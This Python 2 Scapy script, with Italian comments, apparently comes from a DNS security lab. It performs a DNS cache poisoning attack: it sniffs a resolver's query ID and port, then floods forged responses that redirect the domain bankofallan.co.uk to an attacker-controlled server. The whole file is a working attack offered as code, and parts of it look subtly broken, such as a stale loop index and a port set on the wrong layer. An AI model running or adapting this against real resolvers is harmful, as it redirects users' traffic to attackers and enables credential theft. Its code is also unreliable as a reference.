from threading import Thread
import time
from random import randint
from scapy.layers.inet import *
from scapy.layers.dns import *
from scapy.all import *

DNS_SPOOF_IP = "10.0.0.1"
BAD_DNS_IP = "192.168.56.1"
VULN_DNS_IP = "192.168.56.101"

Q_ID = 0                # query ID globale
PORT_NUMBER = 0         # porta da catturare
GOAL = 0                # va a 1 se riesco nell'attacco
N_TRY = 1               # tentativi provati
PACKETS = []

class FirstThread(Thread):

        def __init__(self, name, job, flood):
                Thread.__init__(self)
                self.name = name
                self.job = job
                self.flood = flood

        def run(self):
                #print ("Thread '" + self.name + "' avviato")
                # time.sleep(self.durata)

                if self.job == 0:                                                       # sniffer
                        sniffer_job()

                if self.job == 4:                                                       # in ascolto per il secret
                        secret_job()

                #print ("[THREAD] '" + self.name + "' terminato.")

def sniffer_job():
        '''
        sniffo la query ricorsiva fatta all'host (server autoritativo per badguy.ru)
        catturo query ID e numero di porta
        :return:
        '''
        global Q_ID
        global PORT_NUMBER
        filtro = "src host " + VULN_DNS_IP + " and dst host " + BAD_DNS_IP + " and dst port 53"
        #print filtro
        # TODO deve cambiare se la porta non e' 53
        pkts = sniff(count=1,
                     filter="src host " + VULN_DNS_IP + " and dst host " + BAD_DNS_IP + " and dst port 53",
                     lfilter=lambda pkt: pkt.haslayer(DNS))

        Q_ID = pkts[0].getlayer(DNS).id
        PORT_NUMBER = pkts[0].getlayer(UDP).sport

def secret_job():
        global GOAL
        filtro = "src host " + VULN_DNS_IP + " and dst host " + BAD_DNS_IP + " and dst port 1337"
        scrt_pkt = sniff(count=1, filter= filtro)
        print "[VICTORY] got secret!"
        scrt_pkt[0].show()
        GOAL = 1

def master_job():
        '''
        TODO doc
        :return:
        '''

        global GOAL
        global Q_ID
        global PORT_NUMBER
        global N_TRY
        global  PACKETS

        listener_thread = FirstThread(name="listener", job=4, flood=None)
        listener_thread.start()


        while GOAL == 0:
                print ('\n\n\nTry # ' + str(N_TRY))

                sniffer_thread = FirstThread(name="sniffer", job=0, flood=None)
                sniffer_thread.start()

                send(IP(dst=VULN_DNS_IP) / UDP(sport=(random.randint(40000, 50000))) / DNS(rd=1, qd=DNSQR(qname="badguy.ru")))
                while Q_ID == 0 or PORT_NUMBER == 0:
                        continue

                sniffer_thread.join()

                print ('[FOUND] qID: ' + str(hex(Q_ID)) + '\t port: ' + str(PORT_NUMBER))

                # preparo i Q_ID dei pacchetti
                for index in range(0, 999):
                        PACKETS[i+1].getlayer(DNS).id = Q_ID + 1 + index
                        PACKETS[i+1].getlayer(DNS).sport = PORT_NUMBER

                # TODO controllare le porte
                PACKETS.insert(0, (IP(dst=VULN_DNS_IP) / UDP(sport=(random.randint(40000, 50000)), dport=53) / DNS(rd=1, qd=DNSQR(qname="spoof.bankofallan.co.uk"))))
                send(PACKETS)

                PORT_NUMBER = 0
                Q_ID = 0
                N_TRY = N_TRY + 1
                del PACKETS[0]

        # forse GOAL viene visto al ciclo successivo se il listener e' lento
        print "Goal reached."

        listener_thread.join()
        print "END"

############################ MAIN ###########################

# inizzializzazione treno pacchetti
pkt = IP(dst=VULN_DNS_IP, src=DNS_SPOOF_IP) / UDP(sport=53, dport=PORT_NUMBER) / \
        DNS(id= 0, qr=1L, opcode='QUERY', aa=1L, tc=0L, rd=1L, ra=1L, z=0L, rcode='ok',
            qdcount=1, ancount=1,
            nscount=0, arcount=0,
            qd=(DNSQR(qname='bankofallan.co.uk', qtype='NS', qclass='IN')),
            an=None,
            ns=(DNSRR(rrname='co.uk', type='NS', rclass='IN', ttl=60000, rdlen=24,
                      rdata='bankofallan.co.uk')),
            ar=(DNSRR(rrname='bankofallan.co.uk', type='A', rclass='IN', ttl=60000, rdlen=4,
                      rdata=BAD_DNS_IP)) /
               DNSRR(rrname='.', type=41, rclass=4096, ttl=32768, rdlen=0, rdata=''))

for i in range(1, 1000):
        PACKETS.append(pkt)

master_job()